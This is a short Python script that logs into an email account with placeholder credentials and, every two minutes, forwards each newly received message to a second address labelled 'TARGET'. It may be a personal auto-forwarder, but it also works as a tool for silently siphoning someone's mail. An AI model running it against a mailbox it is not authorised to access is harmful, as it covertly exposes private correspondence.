import zmail
import time



server = zmail.server('DEST@DEST.com', 'PASSWORD')
while True:
    t = time.localtime(time.time())
    timestr = time.strftime("%Y-%m-%d %H:%M:%S",t)
    time.sleep(120)
    mails = server.get_mails(start_time=timestr)
    for mail in mails:
        server.send_mail('TARGET@TARGET.com',mail)